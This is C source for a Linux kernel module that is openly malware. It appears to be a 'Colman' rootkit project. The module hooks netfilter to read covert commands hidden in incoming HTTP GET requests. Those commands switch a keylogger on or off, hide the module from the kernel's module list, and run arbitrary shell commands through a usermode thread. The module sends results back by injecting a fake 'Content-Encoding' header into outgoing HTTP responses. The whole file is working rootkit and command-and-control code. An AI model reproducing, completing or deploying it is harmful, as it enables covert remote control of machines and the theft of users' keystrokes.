#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/version.h>
#include <linux/delay.h>
#include <net/ip.h>
#include <linux/kthread.h> 
// TODO: add #include <linux/string.h> and change memcpy to memcpy_s
#include "engine.h"
#include "cnc.h"
#include "hidder.h"
#include "usermode.h"
#include "keylogger.h"


#define MALWARE_FUNC "colman-function"
#define MALWARE_ARG "colman-arg"
#define RESULT_HEADER_STR "Content-Encoding: "
#define MAX_HTTP_HEADER_LEN 2048
#define MAX_HTTP_DATA_LEN 1024
#define MINIMUM_CNC_DATA 170-24
#define MAX_COMMAND_LEN 500
#define TOT_HDR_LEN 28

#define GET 0x20544547
#define HTTP_OK 0x50545448


struct nf_hook_ops http_hook_out;
struct nf_hook_ops http_hook_in;

int find_malware_struct(void * address, char * string);
unsigned int http_callback( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *));
void set_result_msg(char * result_msg, size_t msg_len);

typedef enum {
	TEST = 0,
	KEYLOGGER,
	SELF_HIDE,
	SHELL,
	KILL
}COMMANDS;


typedef struct _result_msg{
	char * msg;
	int len;
}result_msg;


// Global struct for the result msg
result_msg * global_result_msg = NULL;

// Struct for the usermode thread handler
static struct task_struct *um_thread = NULL;

static struct task_struct *qu_thread = NULL;

// Global struct for the usermode thread handler arguments
run_cmd_args * um_thread_cmd = NULL;

char * callback_busy = NULL;
char result_ready = 0;


void set_result_msg(char * result_msg, size_t msg_len)
{
	if (global_result_msg == NULL)
	{
		global_result_msg = kmalloc(sizeof(result_msg), GFP_ATOMIC);
	}
	else
	{
		kfree(global_result_msg->msg);
		result_ready = 1;
	}
	global_result_msg->msg = (char *)kmalloc(sizeof(char) * msg_len, GFP_ATOMIC);
	global_result_msg->len = msg_len;
	memcpy(global_result_msg->msg, result_msg, msg_len);
}

unsigned int http_callback_result( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_src_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	int offset = 0, len = 0;
  	char result_header[] = RESULT_HEADER_STR;
  	char result_header_end[] = "\r\n";
  	char* ptr;
	int result_msg_len;
	unsigned int space_left = 0;

	if (callback_busy) 
		*callback_busy = 1;

	if (result_ready == 0)
		goto accept_and_exit_result;
	
	iph = ip_hdr(pskb);
	if (NULL == iph) {
		goto accept_and_exit_result;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		goto accept_and_exit_result;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		goto accept_and_exit_result;
	}

	tcp_src_port = ntohs(tcph->source);

	if (80 != tcp_src_port) {
		goto accept_and_exit_result;
	}

	if (!tcph->psh) { // TCP three-way handshake
		goto accept_and_exit_result;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	httph = (u32 *)tcp_data;
	
	if (*httph != HTTP_OK) { // Not GET
		goto accept_and_exit_result;
	}

	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> CHANGE PACKET\n");
	

	if (unlikely(skb_linearize(pskb) != 0))
	{
		printk(KERN_INFO "[-] Colman: not linear\n");
		goto accept_and_exit_result;
	}

	space_left = skb_tailroom(pskb);
	if (space_left == 0)
	{
		printk(KERN_INFO "[-] Colman: check is needed\n");
		goto accept_and_exit_result;	
	}
  	
	printk(KERN_INFO "[+] Colman: space left: %d\n", skb_tailroom(pskb));

    printk(KERN_INFO "[+] Colman: data_len: %d\n", ntohs(iph->tot_len));

    printk(KERN_INFO "[+] Colman: new data_len: %d\n", ntohs(htons(2 + ntohs(iph->tot_len))));

  	result_msg_len =  strlen(result_header) + strlen(result_header_end) + global_result_msg->len;
	printk(KERN_INFO "[+] Colman: len: %d\n", result_msg_len);

	if (space_left < result_msg_len)
	{
		// We can extend the space left
		printk(KERN_INFO "[-] Colman: Not enougth space\n");
		goto accept_and_exit_result;
	}
  	ptr = (char*) skb_put(pskb, result_msg_len); 

  	if (!ptr)
  	{
		printk(KERN_INFO "[-] Colman: Something want wrong\n");
		goto accept_and_exit_result;  		
  	}

  	memcpy(ptr, result_header, strlen(result_header));

  	if (!global_result_msg)
  	{
		printk(KERN_INFO "[-] Colman: No result\n");
		goto accept_and_exit_result;  		
  	}


  	if (!global_result_msg->msg)
  	{
		printk(KERN_INFO "[-] Colman: No result\n");
		goto accept_and_exit_result; 		
  	}

  	memcpy(ptr + strlen(result_header), global_result_msg->msg, global_result_msg->len);

  	memcpy(ptr + strlen(result_header) + global_result_msg->len, result_header_end, strlen(result_header_end));

    
    /* Manipulating necessary header fields */
    iph->tot_len = htons(result_msg_len + ntohs(iph->tot_len));
    printk(KERN_INFO "[+] Colman: New tot len 0x%x\n", iph->tot_len);
    //tcph->len = htons(tot_data_len + TCP_HDR_LEN);

    /* Calculation of IP header checksum */
    iph->check = 0;
    ip_send_check (iph);

    // /* Calculation of TCP checksum */
    tcph->check = 0;
    offset = skb_transport_offset(pskb);
    len = pskb->len - offset;
    tcph->check = ~csum_tcpudp_magic((iph->saddr), (iph->daddr), len, IPPROTO_TCP, 0);

	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));
	printk(KERN_INFO "[+] Colman: PACKET Changed\n");
	result_ready = 0;
	goto accept_and_exit_result;

accept_and_exit_result:
	if (callback_busy) 
		*callback_busy = 0;

	return NF_ACCEPT;	
}


unsigned int http_callback_get_command( unsigned int hooknum, struct sk_buff *pskb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *) )
{
	struct iphdr *iph = NULL;
	struct tcphdr *tcph = NULL;
	u32 *httph = NULL;
	int tcp_dst_port;
	int tcp_data_len=0;
	unsigned char *tcp_data = NULL;
	char command[MAX_COMMAND_LEN];
	int i = 0, index = 0;
	long command_num = 1;

	if (callback_busy) 
		*callback_busy = 1;
	iph = ip_hdr(pskb);
	if (NULL == iph) {
		goto accept_and_exit_cmd;
	}
	if (IPPROTO_TCP != iph->protocol) { // Not TCP
		goto accept_and_exit_cmd;
	}

	tcph = (struct tcphdr *)((char *)iph + (iph->ihl << 2));
	if (NULL == tcph) {
		goto accept_and_exit_cmd;
	}

	tcp_dst_port = ntohs(tcph->dest);


	if (80 != tcp_dst_port) {
		goto accept_and_exit_cmd;
	}


	if (!tcph->psh) { // TCP three-way handshake
		goto accept_and_exit_cmd;
	}
	tcp_data_len = iph->tot_len - (iph->ihl << 2) - (tcph->doff << 2);
	tcp_data = (unsigned char *)(pskb->data + (iph->ihl << 2) + (tcph->doff << 2));

	if (tcp_data_len <= MINIMUM_CNC_DATA + strlen(MALWARE_FUNC)) {
		goto accept_and_exit_cmd;
	}
	
	httph = (u32 *)tcp_data;
	
	if (*httph != GET ) { // Not GET
		goto accept_and_exit_cmd;
	}
	printk(KERN_INFO "[+] Colman: HTTP GET DETECTED -> EXEC COMMANDS\n");
	//printk(KERN_INFO "[+] Colman: saddr = %d.%d.%d.%d:\n",*(unsigned char *)(&iph->saddr), *(unsigned char *)(&iph->saddr + 1), *(unsigned char *)(&iph->saddr + 2), *(unsigned char *)(&iph->saddr + 3));

	index = find_malware_struct(tcp_data, MALWARE_FUNC);
	if (!index)
	{
		goto accept_and_exit_cmd;
	}

	for (i = 2 ; tcp_data[index + strlen(MALWARE_FUNC) + i] != 0xd; i++)
	{
		command[i-2] = tcp_data[index + strlen(MALWARE_FUNC) + i];
		if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_FUNC) + i >= tcp_data_len - 1))
		{
			goto accept_and_exit_cmd;
		}
	}
	command[i-2] = 0x0;

	printk(KERN_INFO "[+] Colman: cmd: %s\n", command);
	if (kstrtol(command, 10, &command_num) != 0)
	{
    	printk(KERN_INFO "[-] Colman: Invlid command.\n");
		goto accept_and_exit_cmd;
	}

	switch ((COMMANDS)command_num) {
		case TEST :
			set_result_msg("MALWARE ON", strlen("MALWARE ON"));
			printk(KERN_INFO "[+] Colman: OK\n");
			break;

		case KILL:
			set_result_msg("Bye", strlen("Bye"));
			
			// if (qu_thread)
			// {
			// 	printk(KERN_INFO "[+] Colman: wake_up_process(qu_thread)\n");
			// 	wake_up_process(qu_thread);
			// }
			printk(KERN_INFO "[+] Colman: after qu_thread\n");
			break;

		case SELF_HIDE:
			if (switch_dkom_lkm())
			{
				set_result_msg("LKM hide: on", strlen("LKM hide: on"));	
			}
			else
			{
				set_result_msg("LKM hide: off", strlen("LKM hide: off"));		
			}
			break;

		case KEYLOGGER:
			index = find_malware_struct(tcp_data, MALWARE_ARG);
			if (!index)
			{
				set_result_msg("Shell command missing", strlen("Shell command missing"));
				goto accept_and_exit_cmd;
			}
			for (i = 2; tcp_data[index + strlen(MALWARE_ARG) + i] != 0xd; i++)
			{
				command[i-2] = tcp_data[index + strlen(MALWARE_ARG) + i];
				if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_ARG) + i >= tcp_data_len - 1))
				{
					goto failed_and_exit;
				}
			}
			command[i-2] = 0x0;

			if (*command == 0x0)
			{
				printk(KERN_INFO "[-] Colman: There is no command to alloc.\n");
				goto failed_and_exit;
				break;
			}
			//ACTIVE KEYLOGGER
			
			printk(KERN_INFO "[+] Colman: keylogger on folder %s.\n", command);
			if (switch_keylogger(command, 0))
			{
				set_result_msg("Keylogger: on :file:", strlen("Keylogger: on :file:"));	
			}
			else
			{
				set_result_msg("Keylogger: off", strlen("Keylogger: off"));		
			}
			//set_result_msg(":file:", strlen(":file:"));
			break;

		case SHELL:
			index = find_malware_struct(tcp_data, MALWARE_ARG);
			if (!index)
			{
				set_result_msg("Shell command missing", strlen("Shell command missing"));
				goto accept_and_exit_cmd;
			}
			for (i = 2; tcp_data[index + strlen(MALWARE_ARG) + i] != 0xd; i++)
			{
				command[i-2] = tcp_data[index + strlen(MALWARE_ARG) + i];
				if (i > MAX_COMMAND_LEN || (index + strlen(MALWARE_ARG) + i >= tcp_data_len - 1))
				{
					goto failed_and_exit;
				}
			}
			command[i-2] = 0x0;

			if (*command == 0x0)
			{
				printk(KERN_INFO "[-] Colman: There is no command to alloc.");
				goto failed_and_exit;
				break;
			}

			if (!um_thread_cmd)
			{
				printk(KERN_INFO "[-] Colman: um_thread_cmd in not allocated.");
				goto failed_and_exit;
				break;
			}
			um_thread_cmd->arg = (char *)kmalloc(sizeof(char) * i, GFP_ATOMIC);
			// TODO: need to free every time....
			if (!um_thread_cmd->arg)
			{
				goto failed_and_exit;
				break;	
			}
			memcpy(um_thread_cmd->arg, command, i-1);

			if (um_thread)
			{
				//um_thread_activate = 1;
				//printk(KERN_INFO "[+] Colman: run %s\n", command);
				wake_up_process(um_thread);
			}
			
			set_result_msg(":file:", strlen(":file:"));
			break;
			
		// case UN_SELF_HIDE:
		// 	set_result_msg("LKM is not hide", strlen("LKM is not hide"));
		// 	unset_dkom_lkm();
		// 	break;

		default:
			set_result_msg("Invalid command", strlen("Invalid command"));
			printk(KERN_INFO "[-] Colman: Invalid command - %ld\n", command_num);
			break;
	}

accept_and_exit_cmd:

	if (callback_busy) 
		*callback_busy = 0;

	return NF_ACCEPT;
failed_and_exit:
	set_result_msg("Failed", strlen("Failed"));

	if (callback_busy) 
		*callback_busy = 0;

	return NF_ACCEPT;
}

int find_malware_struct(void * address, char * string)
{
	void * result = strstr((char *)address, string);
	if (result == NULL || result < address)
		return 0;
	return (int)(result - address);
}

void set_http_callback( void )
{
	//cmd_arguments.arg_len = 0;
	set_result_msg("Init", strlen("Init"));

	um_thread_cmd = (run_cmd_args *)kmalloc(sizeof(run_cmd_args), GFP_ATOMIC);
	um_thread_cmd->arg = NULL;
	um_thread = kthread_create(run_usermode_cmd_thread, um_thread_cmd, "um_thread");

	wake_up_process(um_thread);
	//callback_busy = (char *)kmalloc(sizeof(char), GFP_ATOMIC);
	//qu_thread = kthread_create(quiter_thread, callback_busy, "qu_thread");

	http_hook_in.hook = (void *)http_callback_get_command;
	http_hook_in.hooknum = NF_INET_PRE_ROUTING;
	http_hook_in.pf = PF_INET;
	http_hook_in.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_in);
#else
	nf_register_hook(&http_hook_in);
#endif


	http_hook_out.hook = (void *)http_callback_result;
	http_hook_out.hooknum = NF_INET_POST_ROUTING;
	http_hook_out.pf = PF_INET;
	http_hook_out.priority = NF_IP_PRI_FIRST;

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
	nf_register_net_hook(&init_net, &http_hook_out);
#else
	nf_register_hook(&http_hook_out);
#endif

}


void unset_http_callback ( void )
{
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_in);
#else
	nf_unregister_hook(&http_hook_in);
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 13, 0)
	nf_unregister_net_hook(&init_net, &http_hook_out);
#else
	nf_unregister_hook(&http_hook_out);
#endif

	if (global_result_msg->msg)
		kfree(global_result_msg->msg);
	
	if (global_result_msg)
		kfree(global_result_msg);
	
	if (um_thread)
		kthread_stop(um_thread);
	
	if (um_thread_cmd->arg)
		kfree(um_thread_cmd->arg);

	if (um_thread_cmd)
		kfree(um_thread_cmd);

	// if (qu_thread)
	// 	kthread_stop(qu_thread);

	// kill flag in on
	switch_keylogger(NULL, 1);
}

